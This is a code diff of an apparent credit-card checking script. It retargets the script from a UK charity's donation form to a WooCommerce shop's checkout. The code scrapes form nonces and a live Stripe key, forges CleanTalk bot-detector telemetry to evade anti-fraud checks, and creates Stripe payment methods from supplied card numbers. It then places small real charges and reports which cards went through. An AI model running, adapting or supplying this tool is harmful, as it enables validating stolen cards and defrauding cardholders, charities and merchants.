@@ -1056,241 +1056,115 @@ def Telev(ccx):
 	sess = generate_random_code()
 	
 	headers = {
-            'authority': 'www.foursquare.org.uk',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-	response = s.get('https://www.foursquare.org.uk/donate/', headers=headers)
-	post = re.search(r'name="post_id"\s+value="([^"]+)"', response.text).group(1)
-	form = re.search(r'name="form_id"\s+value="([^"]+)"', response.text).group(1)
-	refer = re.search(r'name="referer_title"\s+value="([^"]+)"', response.text).group(1)
-	queried = re.search(r'name="queried_id"\s+value="([^"]+)"', response.text).group(1)
-	char_form = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', response.text).group(1)
-	nonce = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text).group(1)
-	camp = re.search(r'name="campaign_id"\s+value="([^"]+)"', response.text).group(1)
-	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
-	if not all([post, form, refer, queried, char_form, nonce, camp, pk_live2]):
-		return (f"Error in get values")
-	headers = {
-            'authority': 'www.foursquare.org.uk',
-            'accept': '*/*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarykOFYuDpYc9x9HRaR',
-            'origin': 'https://www.foursquare.org.uk',
-            'referer': 'https://www.foursquare.org.uk/donate/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
+	    'authority': 'puressentialsllc.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBDgTFrpnHpYTpm4A',
+	    'origin': 'https://puressentialsllc.com',
+	    'referer': 'https://puressentialsllc.com/product/hangnover-1-5oz/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+	data = '------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="attribute_pa_single-1-5oz"\r\n\r\nsingle-1-5oz\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n1156\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="product_id"\r\n\r\n1156\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="variation_id"\r\n\r\n2142\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A--\r\n'
+	
+	response = r.post('https://puressentialsllc.com/product/hangnover-1-5oz/', cookies=r.cookies, headers=headers, data=data)
 
-	files = {
-            'email': (None, email),
-        }
 
-	response = s.post(
-            'https://www.foursquare.org.uk/wp-json/cleantalk-antispam/v1/check_email_before_post',
-            headers=headers,
-            files=files,
-        )
+
+
+
+
+
 	headers = {
-            'authority': 'fd.cleantalk.org',
-            'accept': '*/*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/json',
-            'origin': 'https://www.foursquare.org.uk',
-            'referer': 'https://www.foursquare.org.uk/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-        
-	json_data = {
-            'js_event': 'submit',
-            'page_url': 'https://www.foursquare.org.uk/donate/',
-            'data': {
-                'agent': 'bot_detector_1.1.59',
-                'timestamp': int(time.time()),
-                'bot_detector_list_keys_pressed': {
-                    'key_esc_pressed': False,
-                    'key_backspace_pressed': True,
-                    'key_capslock_pressed': False,
-                    'key_shift_ctrl_pressed': False,
-                    'key_shift_alt_pressed': False,
-                    'key_mobile_capslock_pressed': False,
-                },
-                'headless': False,
-                'page_hits': 1,
-                'has_scrolled': True,
-                'mouse_moved': True,
-                'pointer_data': [[599, 239, 3479], [588, 197, 8839]],
-                'screen_info': {
-                    'fullWidth': 360,
-                    'fullHeight': 10873,
-                    'visibleWidth': 360,
-                    'visibleHeight': 714,
-                },
-                'user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-                'REFFERRER': 'https://www.foursquare.org.uk/donate/',
-                'REFFERRER_PREVIOUS': '',
-                'cookies_enabled': True,
-                'has_input_focused': True,
-                'has_key_up': True,
-                'webgl': True,
-                'scrolling_additional': [],
-                'typo': [],
-            },
-            'method_name': 'frontend_data',
-        }
-        
-	response = s.post('https://fd.cleantalk.org/api3.0/frontend_data', headers=headers, json=json_data)
-	try:
-		event = response.json()['event_token']
-	except (KeyError, json.JSONDecodeError):
-		return ("Card Error")
+	    'authority': 'puressentialsllc.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'referer': 'https://puressentialsllc.com/cart/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': user,
+	}
+	
+	response = r.get('https://puressentialsllc.com/checkout/', cookies=r.cookies, headers=headers)
+	
+	
+	anonce = capture(response.text, 'name="woocommerce-process-checkout-nonce" value="','"')
+
+
 	headers = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
-        
-	data = {
-            'type': 'card',
-            'billing_details[name]': 'haha jahahaj',
-            'billing_details[email]': 'tomee1@gmail.com',
-            'billing_details[address][line1]': 'steer 62888',
-            'billing_details[address][postal_code]': '10080',
-            'card[number]': n,
-            'card[cvc]': cvc,
-            'card[exp_month]': mm,
-            'card[exp_year]': yy,
-            'guid': str(uuid.uuid4()),
-            'muid': str(uuid.uuid4()),
-            'sid': str(uuid.uuid4()),
-            'payment_user_agent': 'stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; card-element',
-            'referrer': 'https://www.foursquare.org.uk',
-            'time_on_page': '100659',
-            'key': pk_live2,
-        }
-        
-	response = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	try:
-		pm = response.json()['id']
-	except (KeyError, json.JSONDecodeError):
-		return (f"Error: {response.text}")
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': user,
+	}
+	
+	data = f'billing_details[name]=Tome+Hunty&billing_details[email]={acc}&billing_details[phone]=1+253-290-6967&billing_details[address][city]=Mold&billing_details[address][country]=US&billing_details[address][line1]=56+High+St&billing_details[address][line2]=&billing_details[address][postal_code]=10090&billing_details[address][state]=NY&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fpuressentialsllc.com&time_on_page=65951&client_attribution_metadata[client_session_id]=d526f506-c08c-4a03-bc53-d6b144360874&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=3dfd9f4b-4a23-495e-90ad-4cfffe6fb87ccb7c2b&sid=68e57056-3a7e-444a-8a50-f1c0a57003ef9bac20&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiY0s4U2NSUUlJZW0waVFMN1B2eTBuQjA0NXpQYUwyRzAreGNnT0FFSTlIL2IvWCt6Nk4yUmtoTlhVZ3JzRU5hNDJ0cGFMUUhWY3VYYkxqUStacUQyNXdkWDF4bVBteERVQUFVaENpcmltRDB4SzJGSUpMaDIrU1FtSENZNWxhalhkOUxNQUdZTStXaXJ4bnd2RXQ0aXhKYVNwSEwrT2dUT2E5NWF6RGg5S1czK0lhT2tBQVRZUnRiSGwxenE3MGVBOFNiNmphdks0RmxzWjVOSDUwNXU3eFBJVzI3YzJGblFSOEZ0dmZSSVQzTG1adHB2WXQ0U1dhVXh4NytrOWgxOFlWdWErNWlWMmhXMzFhUXJndlVmUEFWd1o2SWN1NzNsTmpnZ1RzcFNUTld1V09qdjFhaWQzQmYvVUwxVEJsMTZNSW5DYy85OFNXUGNHdUpXR2V4OVRMZTIxVU8zdFVKMW8vS3ZJYy8wVk4zbGRtMUxwbVBVZGJvaVBxQzdKeCtvcFNpYTJLb0dqRHovalZWYzY0SEUwVDVhck15Wk5Eb05VeDUxd3NMbzVURkdickIzM2pBTEFZNGZybVVmdW1DUWFiY0V5V2MyZ3B0T2kzdHNpUGs0L05DdlZSa3JaT0pnYU1pdWNibkd5NjBUWFltVEFTQ0R4Um12SFlLd0MrWE5lME1uWmFWdUJxek4wRmpQWFVwcTlTci9PYTRMZ0orSVB3US9haTRVc3FIaGhacjE4U01YZERsRG82a1NwSmZhVUd6K0dqN2MrU1p5QzBQUUdXVC95RlB1ZTE3ejFXem9yY0tnZ3g4OUIzM3hjZ1RnVFZPS1NYK2JSTm5mY04vcU1INHdqenRoOGlWL3M2WFBBWkx2QjRCS3R3aXptV0VDSWdLOEJGS0JaRERoQWZwclVlZzlCamtYK2I2RWNWeGUra3BQRmtTNm5WQ0hjelRDQ3puajRHZW9hbitydFhFVWRjb3ZubDdZdTN3SDhRYjBYc2xIK2c4MXhCcnJyaWpZZWRiUDZjblJjZ1dtRnl3MDJOd1F3c1RXMVFrTW5KUE5UUlpEKzk5aEdNclZpcDhud2pVQmw1VzhHNURYRkcvM3czWUdFVUJLSGUwOWFLUGk5OGZBYTVBWk92bEIwMFJ2ZkpYczhzenpRVmlMNVZRajBiM3RzMHJMb0xyamdaTWk2STJRZmJtZFlwZklyZU9zakpwa1Vic2dkWEV1TloxVUc2ZEJ4UFMzakJ5dDlLSXFBSkJ2YUNwc2cxc3Y3SVd1Vm53R2NHK3BGR0xDQzV0ZFhLbmlKSTVSQkRtd3FleFFjRDdqKy9Sb1YySE81MWE1ZUFKdFE0a0NvOWVIQkk3czB5b0ZrQkdLSkppSXhxMmNGRXFWS1ovd0w1dGxwVjJLbmxrMktMSEM5YkRZMHRmMGM3WC9EeTVOclVzdlBzUk5pNEJDdzlsWHBBcmVPV0lZVStpUUJJRnBNQk5kZXE3WEI3cWN2Z21xYTVibkpnUHlOMGQxQXIwSGdyS3FvNU5VaENLeHdSTkpjeUc3QnhMYVBZQWpuckowa0piVHRNa054NXZmQ1ZlbGZvMTFFUGZaYVg4UWljSjgvMTRkWnNacW9NUTI0bFVnSVE1U0RVcE9wTEwrZXVUbGhGWk04VDA2cmFYem5lTk9iTzNXb2tlMW43d0loTVRoc1hHWXhJQ2hySHdMSVMxRUVvNExybFp6Y2RLSnNNMGhPdmdrdyt3VkJwY1BnUDB0ZVdTL2t3NTFoZTJtUGFPQ1FwZXI0SWY5UVlWL1ZRL3c4UnNIVUdUaWpaZkhRYitKdU56eVR6TVhoVjlsbjJDUXB0bW9iTjJyM1JiVW1tNUJXQklMR1F1bkkvc3pySkZHSFJXVGdadUhDcEhTMHI4TS9LRVpZbi9WL2ZCSzM5VTcxMDhrSFhXM0NUOWdZWW5qTTFaNUkrWFp0MjJSWUpKQmE1QnU1OTZOQjRRZ1krakdBcy8rbkY4ZzdNNGZKNUU4TFA4VlR0MkgwdEF5T0RIZXp1QWxibGJMZ0Ewd0tBYWRzRjBMaUlFQUI1OCtEaHI5bGN1R0t4bzdLbjlDYnVDS2Y1TlBNczQreEFHM0pwNmREZm1LRkF6T2J2M1ZHN1dKU2VqMEc0OVhNS3dBc3VuWWlOREZ1bUNkbUFYMFB2VEVBTnYxUjlFWHNsWW05N0ljOGdwVlV4cURaanI1Rlh6RUJkRjJFc0hpS1FzLzY4cFlHamRMNmtXRGU3bkhRc1BSNXpzRCtRTzlQWGRSMkZaZEZGU3JzSEtLYW1aTjJKUkpoQWh1NUlQYmFrNFRmV29STjNVa2xPQjc2ajJnVkZSMk0yQ2dtemwrWFpPOTNmcWtNOFBzWUY0MUVtSkVKeXdxVEZIZEU4eW8rbkZhSXJBV1ZlNWMxY1MzSkwwNE9IbjU4eUEwdUo3VTB5R3hkWnJmanBhNUg3aVRvdHpaWldoY0JRaSs5dGduWjluS3pWREVEOWdncTJRWXlmbDk5cEh1TkRPZmZndUdyT01nY0d1b2FGYThOS2ZDUUVFcDBJTlJzVXBrOTFjMVZuSWRNYSs4VzZEdmNjRzZ5bFZIWE9kdndpdUp5TmNaejZONUprU213WkFIN1dkeFV4eTJoSVAzdWlqQkEyYWZNY1lsV3ZLYmVBV0JCQ2I2QnRrZ0lWRmJNS2N5aEJ4T055WWlISlZmWlJCbmVpaGU3RGVleElnS29jSDVmMVZUMG9yNzdPVGlnSHJsSHhjeFdnTjdnZFpIVUsreEgzaVdwck85eFVuWVoyRG15ZlFIMjBjVWxsd09CUkdyRTlObDBtL0E3c25veE5ldGhGOTRua3hBR1dKc2J4YmRHMjdnaHFFa2hORXFUUWhrak5lRWQ3RmNNMG96eWVsd0RoWEs0bFYxZXc9PSIsImV4cCI6MTczMTE2NjcwMCwic2hhcmRfaWQiOjMzOTUxMDMwMywia3IiOiJlNGNmOSIsInBkIjowLCJjZGF0YSI6ImxsQkkwdjJLbURTOXptK3h4bUlwZnhiQ0xnT3JadUw3TEM4VzN0S1dPcHI4ZjgxWE5BV3JPcFJKMENKekxIcE05anRGWnFqUWdLV0VBQU1HbWFkd0lJTUp2V1JDdE41R3VVanl5YzY1UXpEb0ZuUi9GdHZLZUpjR0RmMU9pVXppZkFKbmFuTW5mazllWkxwelc1RVp6U0RPZU05UXRCRU4xQlR1aXhFUm1YL2pqSnEzaXZPSnFzdGZGK0pEczI1dzFvS1VJYVEzR3JvTFpIa3AifQ.wlqIqIqR945LkwBpEBtlGYvrlNH1tD_ue3LSNZGhZBg'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	if not 'id' in response.json():
+		print('ERORR CARD')
+	else:
+		id=response.json()['id']
+
 	headers = {
-            'authority': 'www.foursquare.org.uk',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://www.foursquare.org.uk',
-            'referer': 'https://www.foursquare.org.uk/donate/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-        
-	data = {
-            'charitable_form_id': char_form,
-            f'{char_form}': '',
-            '_charitable_donation_nonce': nonce,
-            '_wp_http_referer': '/donate/',
-            'campaign_id': camp,
-            'description': 'Four Square Donation',
-            'ID': '0',
-            'gateway': 'stripe',
-            'donation_amount': 'custom',
-            'custom_donation_amount': '1.00',
-            'recurring_donation': 'once',
-            'title': 'Mr',
-            'first_name': 'exeee',
-            'last_name': 'waysss',
-            'email': email,
-            'address': 'steer 62888',
-            'postcode': '10080',
-            'tax_disclaimer': '',
-            'stripe_payment_method': pm,
-            'ct_bot_detector_event_token': event,
-            'action': 'make_donation',
-            'form_action': 'make_donation',
-        }
-        
-	response = s.post('https://www.foursquare.org.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
-	response_text = response.text
-	if 'succeeded' in response_text:
-		return (f"Charge 1.00$")
-	elif 'Your card was declined.' in response_text:
-		return (f"Your card was declined.")
-	elif 'Your card number is incorrect.' in response_text:
-		return(f"Your card number is incorrect.")
+	    'authority': 'puressentialsllc.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'origin': 'https://puressentialsllc.com',
+	    'referer': 'https://puressentialsllc.com/checkout/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': user,
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    'wc-ajax': 'checkout',
+	}
+	
+	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_session_start_time=2024-11-09+15%3A21%3A23&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_email={acc}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_session_start_time=2024-11-09+15%3A21%3A23&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Tome&billing_last_name=Hunty&billing_company=&billing_country=US&billing_address_1=56+High+St&billing_address_2=&billing_city=Mold&billing_state=NY&billing_postcode=10090&billing_phone=1+253-290-6967&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flexible_shipping_single%3A13&payment_method=woocommerce_payments&wc_poynt_credit_card_nonce=&mailpoet_woocommerce_checkout_optin=1&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce={anonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wcpay-payment-method={id}&wcpay-fingerprint=016e96f79df6027a6c69222c48c94a1a&wcpay-fraud-prevention-token='
+	
+	response = r.post('https://puressentialsllc.com/', params=params, cookies=r.cookies, headers=headers, data=data)
+	
+	msg=response.text
+	if 'success' in msg or 'Thank you for your order.' in msg or 'successed' in msg or 'Thank you' in msg or 'Payment Successful' in msg:
+		return 'Charged !✅'
+	if "The card's security code is incorrect." in msg:
+		return "The card's security code is incorrect."
 	else:
 		try:
-			error_msg = response.json()
-			eeee=(f"{error_msg}")
+			ms = response.json()['messages']
+			msg1 = capture(ms, '<li>','</li>').strip()
+			return msg1
 		except:
-			eeee=(f"{response_text[:200]}")
-	try:
-	    exe = response.json()
-	except:
-	    print("Error in last req")
-	try:
-		secret_key=exe.get('secret')
-		pi_id = secret_key.split('_secret')[0]
-	except:
-	   print(eeee)
-	   return "Error in get sec"
-	headers = {
-	        'accept': 'application/json',
-	        'accept-language': 'tr-AZ,tr;q=0.9,az-AZ;q=0.8,az;q=0.7,en-US;q=0.6,en;q=0.5',
-	        'content-type': 'application/x-www-form-urlencoded',
-	        'origin': 'https://js.stripe.com',
-	        'priority': 'u=1, i',
-	        'referer': 'https://js.stripe.com/',
-	        'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
-	        'sec-ch-ua-mobile': '?0',
-	        'sec-ch-ua-platform': '"Windows"',
-	        'sec-fetch-dest': 'empty',
-	        'sec-fetch-mode': 'cors',
-	        'sec-fetch-site': 'same-site',
-	        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
-	    }
-	con = f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm'
-	condat = f'expected_payment_method_type=card&use_stripe_sdk=true&key={pk_live2}&client_secret={secret_key}'
-	fin = s.post(con, headers=headers, data=condat)
-	mssgg=fin.json()
-	if 'Insufficient funds' in mssgg or 'fund' in mssgg:
-	    return 'Insufficient funds'
-	if mssgg.get("status") == "succeeded":
-	    return "Charge ✅"
-	else:
-	    err = mssgg.get("error", {})
-	    decline = (err.get("decline_code")
-	or err.get("code")
-	or err.get("payment_intent", {})
-	    .get("last_payment_error", {})
-	    .get("decline_code"))
-	    return decline or "Unknown error"
-
+			return 'eror'
